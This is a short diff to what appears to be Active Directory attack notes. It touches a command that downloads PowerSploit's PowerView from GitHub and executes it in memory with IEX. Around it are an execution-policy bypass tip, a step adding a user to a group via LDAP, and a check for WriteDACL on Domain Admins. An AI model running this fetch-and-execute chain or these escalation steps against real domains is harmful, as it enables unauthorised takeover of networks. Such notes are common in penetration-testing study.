@@ -66,10 +66,12 @@ $group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
 ---------------------------------------------------------------------------------
 ### with ✔ Modify permissions
 
+```bash
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
 Get-Command -Module PowerView
 
+```
 . (If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)
 
 # Verify if 'bb2' has WriteDACL on Domain Admins
